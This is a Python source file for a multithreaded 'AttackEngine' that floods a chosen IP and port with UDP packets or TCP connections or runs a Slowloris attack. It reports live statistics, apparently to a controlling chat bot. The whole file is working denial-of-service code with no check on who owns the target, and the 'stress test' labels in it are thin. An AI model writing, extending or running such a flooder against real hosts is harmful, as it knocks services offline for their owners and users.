import socket
import random
import threading
import time
import logging
from dataclasses import dataclass, field
from typing import Dict, Optional

logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s')
logger = logging.getLogger("AttackEngine")


@dataclass
class AttackStats:
    total_requests: int = 0
    successful: int = 0
    failed: int = 0
    start_time: Optional[float] = None
    threads_active: int = 0
    is_running: bool = False
    target: str = ""
    port: int = 0
    _lock: threading.Lock = field(default_factory=threading.Lock)

    def reset(self, target="", port=0):
        with self._lock:
            self.total_requests = 0
            self.successful = 0
            self.failed = 0
            self.start_time = time.time()
            self.is_running = True
            self.target = target
            self.port = port

    def log_success(self):
        with self._lock:
            self.total_requests += 1
            self.successful += 1

    def log_failure(self):
        with self._lock:
            self.total_requests += 1
            self.failed += 1

    def decrement_threads(self):
        with self._lock:
            self.threads_active -= 1


class AttackEngine:
    def __init__(self, max_requests: int, thread_count: int, timeout: int):
        self.max_requests = max_requests
        self.thread_count = thread_count
        self.timeout = timeout
        self.stats = AttackStats()
        self._stop_event = threading.Event()

    def _should_stop(self) -> bool:
        if self._stop_event.is_set():
            return True
        if self.stats.total_requests >= self.max_requests:
            return True
        if self.stats.start_time and (time.time() - self.stats.start_time) >= self.timeout:
            return True
        return False

    def get_status(self) -> Dict:
        """Get current status for bot display"""
        duration = time.time() - self.stats.start_time if self.stats.start_time else 0
        rps = self.stats.total_requests / duration if duration > 0.001 else 0
        
        return {
            'running': self.stats.is_running,
            'target': self.stats.target,
            'port': self.stats.port,
            'progress': self.stats.total_requests,
            'max': self.max_requests,
            'successful': self.stats.successful,
            'failed': self.stats.failed,
            'rps': round(rps, 2),
            'duration': duration,
            'threads_active': self.stats.threads_active
        }

    def udp_flood(self, target_ip: str, target_port: int):
        payload = random._urandom(1400)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        try:
            while not self._should_stop():
                try:
                    sock.sendto(payload, (target_ip, target_port))
                    self.stats.log_success()
                except socket.error:
                    self.stats.log_failure()
        finally:
            sock.close()
            self.stats.decrement_threads()

    def tcp_flood(self, target_ip: str, target_port: int):
        while not self._should_stop():
            try:
                with socket.create_connection((target_ip, target_port), timeout=5) as s:
                    s.sendall(b"GET / HTTP/1.1\r\nHost: target\r\n\r\n")
                    self.stats.log_success()
            except (socket.error, TimeoutError):
                self.stats.log_failure()
        self.stats.decrement_threads()

    def slowloris(self, target_ip: str, target_port: int):
        sockets = []
        try:
            while not self._should_stop() and len(sockets) < 100:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(5)
                    s.connect((target_ip, target_port))
                    s.send(f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\n".encode())
                    s.send("User-Agent: StressTester/1.0\r\n".encode())
                    sockets.append(s)
                    self.stats.log_success()
                except socket.error:
                    self.stats.log_failure()
                    break

            while not self._should_stop():
                for s in list(sockets):
                    try:
                        s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                    except socket.error:
                        sockets.remove(s)
                time.sleep(15)
        finally:
            for s in sockets:
                try:
                    s.close()
                except:
                    pass
            self.stats.decrement_threads()

    def start_attack(self, target_ip: str, target_port: int, method: str = "udp"):
        if self.stats.is_running:
            return False

        self.stats.reset(target_ip, target_port)
        self._stop_event.clear()
        self.stats.threads_active = self.thread_count

        methods = {
            "udp": self.udp_flood,
            "tcp": self.tcp_flood,
            "slowloris": self.slowloris
        }
        
        target_func = methods.get(method.lower(), self.udp_flood)
        logger.info(f"Starting {method.upper()} test on {target_ip}:{target_port}")
        
        for i in range(self.thread_count):
            t = threading.Thread(target=target_func, args=(target_ip, target_port), daemon=True)
            t.start()
        return True

    def stop_attack(self) -> Dict:
        self._stop_event.set()
        self.stats.is_running = False
        
        duration = time.time() - self.stats.start_time if self.stats.start_time else 0
        rps = self.stats.total_requests / duration if duration > 0.001 else 0
        
        return {
            'total': self.stats.total_requests,
            'successful': self.stats.successful,
            'failed': self.stats.failed,
            'duration': round(duration, 2),
            'rps': round(rps, 2)
        }
